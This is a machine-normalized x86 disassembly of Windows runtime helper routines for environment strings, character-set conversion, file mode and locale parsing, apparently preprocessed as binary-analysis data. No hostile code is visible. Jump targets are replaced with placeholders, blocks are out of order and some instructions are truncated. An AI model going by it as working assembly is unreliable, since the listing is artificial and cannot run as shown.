pop esi
mov eax edx
pop ebx
pop ebp
retn
push edi
mov ecx esi
lea edi [ ecx + 0x2 ]
inc edx
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edi
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
cmp ax 0x3d
je r-xdata
pop edi
sub_42a854
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
mov esi edi
mov al [ edi ]
jmp r-xdata
test al al
jne r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_42d49d
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ecx esi
lea ebx [ ecx + 0x1 ]
inc edx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx ebx
inc esi
add esi ecx
mov al [ esi ]
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
cmp [ edi ] 0x3d
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
je r-xdata
push 0x0
call sub_42d3b1
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
add edi eax
push 0x1
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push ebx
call sub_42aa1f
push 0x0
call sub_42d3b1
pop ecx
pop ecx
push edi
push [ ebp - 0x8 ]
push esi
call sub_42d2ce
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax [ ebp - 0x4 ]
push 0x0
mov [ eax ] esi
add eax 0x4
mov [ ebp - 0x4 ] eax
call sub_42d3b1
mov eax [ ebp - 0x8 ]
pop ecx
sub_42a925
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx eax
push esi
push edi
movzx eax [ ebx ]
mov esi ebx
test ax ax
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_42d49d
mov edi eax
xor esi esi
pop ecx
pop ecx
test edi edi
je r-xdata
push 0x3d
pop ebx
mov edi esi
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov ecx esi
lea edi [ ecx + 0x2 ]
inc edx
cmp [ ebx ] si
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edi
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x2 ]
jmp r-xdata
cmp ax bx
je r-xdata
mov ebx [ ebp + 0x8 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x3d
lea eax [ ecx + 0x1 ]
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebx ] cx
je r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ ebx + eax * 2 ]
push 0x2
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call sub_42aa4e
xor esi esi
push esi
call sub_42d3b1
pop ecx
pop ecx
push ebx
push [ ebp - 0x8 ]
push esi
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
xor esi esi
add eax 0x4
push esi
mov [ ebp - 0x4 ] eax
call sub_42d3b1
mov eax [ ebp - 0x8 ]
pop ecx
sub_42aa1f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_42d3b1
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_42d3b1
pop ecx
pop edi
sub_42aa4e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_42d3b1
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_42d3b1
pop ecx
pop edi
sub_42aa87
mov edi edi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push esi
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
pop edi
retn
cmp [ edi ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push [ edi ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
push 0x1
push ebx
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
push esi
call sub_42d3b1
pop ecx
push 0x0
push 0x0
push ebx
push esi
push 0xffffffff
push [ edi ]
xor ebx ebx
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push ebx
push esi
call sub_438b42
push ebx
call sub_42d3b1
add esp 0xc
add edi 0x4
sub_42ab06
mov edi edi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push esi
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
pop edi
retn
cmp [ edi ] ebx
jne r-xdata
push ebx
push ebx
push 0xffffffff
push [ edi ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
push 0x2
push ebx
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
push esi
call sub_42d3b1
pop ecx
push ebx
push esi
push 0xffffffff
push [ edi ]
xor ebx ebx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push ebx
push esi
call sub_438b4d
push ebx
call sub_42d3b1
add esp 0xc
add edi 0x4
sub_42abaf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42d2ce
add esp 0xc
pop ebp
retn
sub_42abcd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436420
add esp 0xc
pop ebp
retn
sub_42abeb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_42ac03
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_42ac21
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42ac61
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
sub_42ad11
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
pop ebp
retn
sub_42ad2b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ WideCharToMultiByte@IAT ]
pop ebp
retn
sub_42ad64
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ WideCharToMultiByte@IAT ]
pop ebp
retn
sub_42adb7
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42ade8
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42ae59
push sub_42aca1
mov ecx rw-data
call sub_42ac21
push sub_42acbc
mov ecx rw-data
call sub_42ac61
push [ rw-data ]
call sub_42aa1f
push [ rw-data ]
call sub_42aa4e
pop ecx
pop ecx
retn
sub_42aece
mov edi edi
push ebx
push esi
call sub_437a77
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor bl bl
mov esi rw-data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movsx eax al
push eax
call sub_43803a
pop ecx
test eax eax
je r-xdata
test bl bl
sete bl
mov eax esi
pop esi
pop ebx
retn
test bl bl
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x20
jg r-xdata
cmp al 0x20
jg r-xdata
inc esi
sub_42af21
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push 0x20
xor dl dl
pop esi
mov eax rw-data
cmp ecx 0x22
jne r-xdata
test cx cx
je r-xdata
add eax 0x2
jmp r-xdata
test dl dl
sete dl
pop esi
retn
test dl dl
je r-xdata
movzx ecx [ eax ]
cmp cx si
ja r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx si
ja r-xdata
add eax 0x2
sub_42af94
mov edi edi
push ebx
push esi
call sub_437a77
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor bl bl
mov esi rw-data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movsx eax al
push eax
call sub_43803a
pop ecx
test eax eax
je r-xdata
test bl bl
sete bl
mov eax esi
pop esi
pop ebx
retn
test bl bl
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x20
jg r-xdata
cmp al 0x20
jg r-xdata
inc esi
sub_42afe7
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push 0x20
xor dl dl
pop esi
mov eax rw-data
cmp ecx 0x22
jne r-xdata
test cx cx
je r-xdata
add eax 0x2
jmp r-xdata
test dl dl
sete dl
pop esi
retn
test dl dl
je r-xdata
movzx ecx [ eax ]
cmp cx si
ja r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx si
ja r-xdata
add eax 0x2
sub_42b02d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
add eax 0x3
push edi
xor edi edi
shr eax 0x2
cmp [ ebp + 0xc ] esi
sbb ebx ebx
not ebx
and ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
add esi 0x4
inc edi
cmp edi ebx
jne r-xdata
mov ecx eax
call [ r--data ]
call [ ebp - 0x8 ]
sub_42b089
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
xor eax eax
add esi 0x4
mov ecx edi
call [ r--data ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_42b0da
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
push 0x16
pop eax
pop ebp
retn
sub_42b106
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
push 0x16
pop eax
pop ebp
retn
sub_42b143
push 0x18
push r--data
call sub_40d270
mov edi [ ebp + 0xc ]
cmp edi 0x4000
je r-xdata
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
cmp edi 0x8000
je r-xdata
test esi esi
js r-xdata
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
cmp edi 0x10000
je r-xdata
call sub_430f56
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
cmp edi 0x40000
je r-xdata
mov ecx esi
sar ecx 0x6
mov [ ebp - 0x20 ] ecx
mov eax esi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x24 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
cmp edi 0x20000
je r-xdata
push esi
call sub_438cfe
pop ecx
or ebx 0xffffffff
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
push edi
push esi
call sub_42b251
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430e30
call sub_40d2b6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b230
mov eax ebx
jmp r-xdata
sub_42b251
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi eax
and eax 0x3f
sar edi 0x6
imul edx eax 0x30
mov esi [ edi * 4 + rw-data ]
mov al [ esi + edx + 0x28 ]
mov bl [ esi + edx + 0x29 ]
movzx ecx al
and ecx 0x80
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x4000
je r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov ecx [ edi * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] 0x0
cmp ecx 0x8000
je r-xdata
test bl bl
jne r-xdata
mov eax 0x8000
jmp r-xdata
and al 0x7f
mov [ esi + edx + 0x28 ] al
jmp r-xdata
cmp ecx 0x10000
je r-xdata
xor eax eax
cmp bl 0x1
setne al
dec eax
and eax 0x30000
add eax 0x10000
mov eax 0x4000
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x2
jmp r-xdata
cmp ecx 0x20000
je r-xdata
cmp ecx 0x40000
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x1
jmp r-xdata
sub_42b396
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push [ eax ]
call sub_43a5c0
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b3d4
call sub_40d2b6
retn 0xc
sub_42b3e0
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42b70c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b417
call sub_40d2b6
retn 0xc
sub_42b423
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b45f
call sub_40d2b6
retn 0xc
sub_42b46b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b396
mov esp ebp
pop ebp
retn
sub_42b493
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b423
mov esp ebp
pop ebp
retn
sub_42b4bb
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42b3e0
mov esp ebp
pop ebp
retn
sub_42b4e3
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
push eax
call sub_42b35b
mov esp ebp
pop ebp
retn
sub_42b522
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_42b5a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_42b680
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push 0xb8
push 0x1
mov edi ecx
call sub_42d49d
mov esi eax
mov eax [ edi ]
push 0x0
mov [ eax ] esi
call sub_42d3b1
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call sub_42b4bb
pop ecx
pop ecx
sub_42b70c
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax ]
push [ eax + 0x4c ]
mov eax [ esi ]
push [ eax ]
call sub_42bb4f
mov eax [ esi + 0x10 ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi ]
push [ eax ]
call sub_42c3ef
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ ecx ] eax
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
call sub_43a809
mov eax [ esi ]
push [ eax ]
call sub_43a63d
pop ecx
pop ecx
mov eax [ esi + 0x10 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0x4 ]
mov eax [ eax ]
add eax 0x4c
push eax
call sub_43a901
mov eax [ esi ]
push [ eax ]
call sub_43a809
mov eax [ esi + 0x4 ]
add esp 0xc
mov eax [ eax ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov edx rw-data
push edi
pop esi
retn
test [ rw-data ] 0x1
jne r-xdata
sbb eax eax
or eax ecx
test di di
je r-xdata
push [ eax + 0x4c ]
push rw-data
call sub_43a901
mov eax [ rw-data ]
pop ecx
pop ecx
pop esi
mov ecx [ eax + 0x88 ]
mov [ rw-data ] ecx
mov ecx [ eax ]
mov [ rw-data ] ecx
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
retn
mov eax rw-data
xchg [ eax ] ecx
xor eax eax
jmp r-xdata
mov di [ eax + 0x2 ]
cmp di [ edx + 0x2 ]
jne r-xdata
pop edi
test eax eax
je r-xdata
add eax 0x4
add edx 0x4
test di di
jne r-xdata
mov di [ eax ]
xor ecx ecx
inc ecx
cmp di [ edx ]
jne r-xdata
sub_42b88b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push 0x55
push [ ebp + 0x8 ]
call sub_4349f1
mov ebx eax
pop ecx
pop ecx
cmp ebx 0x55
jb r-xdata
xor eax eax
pop ebp
retn
lea eax [ ebx * 2 + 0x2 ]
push edi
push eax
call sub_42d3eb
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp + 0x8 ]
push eax
push edi
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax edi
jmp r-xdata
sub_42b8fc
push 0x8
push r--data
call sub_40d270
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_40d2b6
retn
push 0x4
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_43a901
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b945
sub_42b94e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436420
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_430e5d
int3
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
add edi 0x100
cmp [ edi ] si
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c195
add esp 0x14
pop edi
pop esi
pop ebp
retn
push edi
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42c195
add esp 0x14
sub_42b9be
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push 0x1ca
push ebx
push edi
call sub_40dea0
mov esi [ ebp + 0xc ]
add esp 0xc
movzx eax [ esi ]
test ax ax
jne r-xdata
push 0x2e
pop ecx
cmp ax cx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x2 ]
cmp [ eax ] bx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
lea ecx [ esi + eax * 2 ]
movzx ebx [ ecx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
push 0x2c
pop edx
test ecx ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x100 ]
push 0x10
push eax
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x11e ] ax
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
push 0x2e
pop ecx
cmp bx cx
je r-xdata
cmp eax 0x10
jae r-xdata
cmp ebx 0x5f
je r-xdata
push eax
push esi
push 0x40
push edi
jmp r-xdata
test bx bx
je r-xdata
push eax
push esi
push 0x40
lea eax [ edi + 0x80 ]
jmp r-xdata
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
push eax
push esi
push 0x10
lea eax [ edi + 0x100 ]
cmp bx dx
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x2c
pop eax
cmp bx ax
je r-xdata
call sub_430e5d
int3
test bx bx
je r-xdata
mov esi [ ebp - 0x8 ]
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
push r--data
push esi
call sub_43a35f
pop ecx
pop ecx
test eax eax
je r-xdata
sub_42baed
mov edi edi
push ebp
mov ebp esp
push esi
call sub_430a7e
mov edx [ ebp + 0x8 ]
mov esi eax
push 0x0
pop eax
mov ecx [ esi + 0x350 ]
test cl 0x2
sete al
inc eax
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
test edx edx
je r-xdata
pop esi
pop ebp
retn
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0x350 ] ecx
jmp r-xdata
sub_42bb4f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x2e
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax + 0xc ] 0x0
push eax
call sub_43a5c0
pop ecx
pop edi
sub_42bb7e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x5
ja r-xdata
xor eax eax
test eax eax
je r-xdata
push 0x83
lea ecx [ ebp - 0x10c ]
push ecx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42c08c
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_42bbe2
mov edi edi
push ebp
mov ebp esp
sub esp 0x1f4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1ec ] ebx
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x1dc ] edi
test esi esi
jne r-xdata
call sub_430a7e
push 0x55
lea ecx [ eax + 0x68 ]
mov [ ebp - 0x1d8 ] ecx
lea ecx [ eax + 0x6c ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ eax + 0x172 ]
add eax 0x2a0
mov [ ebp - 0x1d4 ] ecx
push eax
push [ ebp + 0x18 ]
xor ecx ecx
mov [ ebp - 0x1f0 ] eax
push edi
mov [ ebp - 0x1f4 ] ecx
mov [ ebp - 0x1e4 ] ecx
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
